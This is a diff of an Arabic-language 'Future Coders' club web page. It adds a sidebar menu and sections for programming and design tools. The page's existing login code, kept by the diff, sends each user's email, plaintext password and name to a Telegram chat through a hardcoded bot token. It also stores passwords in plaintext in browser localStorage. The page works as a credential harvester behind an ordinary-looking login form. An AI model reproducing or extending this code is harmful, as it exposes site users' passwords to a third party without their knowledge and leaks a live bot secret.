@@ -18,9 +18,18 @@
             color: white;
             padding: 10px 0;
             text-align: center;
+            position: relative; /* لإضافة القائمة في الأعلى اليمين */
         }
         header h1 {
             margin: 0;
+        }
+        .menu-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+            font-size: 24px;
+            color: white;
         }
         h2 {
             color: red;
@@ -69,13 +78,52 @@
             border-radius: 5px;
             margin-bottom: 10px;
         }
+        /* قائمة جانبية */
+        .sidebar {
+            display: none;
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 200px;
+            height: 100%;
+            background-color: #007BFF;
+            color: white;
+            padding: 20px;
+            box-shadow: -2px 0 5px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        .sidebar a {
+            display: block;
+            color: white;
+            text-decoration: none;
+            margin: 10px 0;
+        }
+        /* الصفحة الجديدة */
+        .new-section {
+            display: none;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 500px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
     </style>
 </head>
 <body>
 
     <header>
         <h1>Future Coders - <span id="header-title">تسجيل دخول</span></h1>
+        <div class="menu-icon" onclick="toggleSidebar()">☰</div>
     </header>
+
+    <!-- Sidebar Menu -->
+    <div class="sidebar" id="sidebar">
+        <h2>القائمة</h2>
+        <a href="#" onclick="showProgrammingTools()">أدوات البرمجة</a>
+        <a href="#" onclick="showDesignTools()">أدوات التصميم</a>
+        <a href="#" onclick="hideSidebar()">إغلاق</a>
+    </div>
 
     <!-- Login Page -->
     <section class="section" id="login-section">
@@ -171,23 +219,51 @@
         </section>
     </section>
 
+    <!-- أدوات البرمجة -->
+    <section class="new-section" id="programming-tools-section">
+        <h2 style="color: blue;">أدوات البرمجة</h2>
+        <p style="margin-top: 5cm;">مرحبا بك في صفحة أدوات البرمجة الخاصة بنادي Future Coders، حيث هنا ستجد جميع الأدوات اللازمة التي ستساعدك في تعلم البرمجة.</p>
+    </section>
+
+    <!-- أدوات التصميم -->
+    <section class="new-section" id="design-tools-section">
+        <h2 style="color: blue;">أدوات التصميم</h2>
+        <p style="margin-top: 5cm;">مرحبا بك في صفحة أدوات التصميم الخاصة بنادي Future Coders، حيث هنا ستجد جميع الأدوات التي تحتاجها لتعلم التصميم.</p>
+    </section>
+
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
         const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // Bot token
         const chatId = "6919240425"; // Chat ID
 
+        // Toggle sidebar
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            sidebar.style.display = sidebar.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // Hide sidebar
+        function hideSidebar() {
+            document.getElementById('sidebar').style.display = 'none';
+        }
+
+        // Show programming tools page
+        function showProgrammingTools() {
+            hideSidebar();
+            showSection('programming-tools-section');
+        }
+
+        // Show design tools page
+        function showDesignTools() {
+            hideSidebar();
+            showSection('design-tools-section');
+        }
+
         // Navigate between sections
         function showSection(sectionId) {
             document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
-            document.getElementById(sectionId).classList.remove('hidden');
-
-            // Update the header title based on the section
-            const headerTitle = {
-                'login-section': 'تسجيل دخول',
-                'register-section': 'إنشاء حساب',
-                'club-section': 'Future Coders'
-            };
-            document.getElementById('header-title').textContent = headerTitle[sectionId];
+            document.querySelectorAll('.new-section').forEach(section => section.style.display = 'none'); // Hide new sections
+            document.getElementById(sectionId).style.display = 'block'; // Show the selected section
         }
 
         // Login
@@ -196,19 +272,20 @@
             const loginPassword = document.getElementById('login-password').value;
             const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
 
-            // Check if email and password fields are filled
+            const user = Object.values(storedUsers).find(user => user.email === loginEmail && user.password === loginPassword);
+
+            // Check if all fields are filled
             if (!loginEmail || !loginPassword) {
                 document.getElementById('login-error').textContent = 'يرجى ملء جميع الحقول';
                 document.getElementById('login-error').style.display = 'block';
                 return;
             }
 
-            const user = Object.values(storedUsers).find(user => user.email === loginEmail && user.password === loginPassword);
-
             if (user) {
                 const message = `Login: Email: ${user.email}, Password: ${user.password}, First Name: ${user.firstName}, Last Name: ${user.lastName}`;
                 sendMessageToTelegram(message);
                 showSection('club-section'); // Navigate to Coders Club page
+                document.getElementById('header-title').textContent = 'نادي المبرمجين'; // Update header title
             } else {
                 document.getElementById('login-error').style.display = 'block';
             }
